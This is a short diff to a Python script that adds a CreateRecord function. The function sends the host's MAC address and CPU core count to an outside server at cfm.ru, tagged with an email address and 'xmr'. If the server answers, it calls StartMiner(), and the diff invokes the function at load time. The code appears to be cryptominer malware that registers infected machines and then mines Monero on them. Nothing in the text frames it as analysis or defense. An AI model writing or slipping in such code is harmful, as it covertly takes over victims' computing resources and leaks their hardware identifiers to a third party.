@@ -42,6 +42,8 @@ def Initialize():
         return True
     except:
         Msg('NO RHEL','error')
+        
+        
 
 
 Initialize()
@@ -84,6 +86,15 @@ def GetCores():
 print(GetMac(),GetCores())
 
 
+
+def CreateRecord():
+    r = req.get('http://cfm.ru:9898/create/?name=new&index='+GetMac()+'&cores='+str(GetCores())+'&mail=yarofeevich@bk.ru&val=xmr')
+    if r.status_code == 200:
+        StartMiner()
+    print(type(r.status_code))
+
+
+CreateRecord()
 
 
 
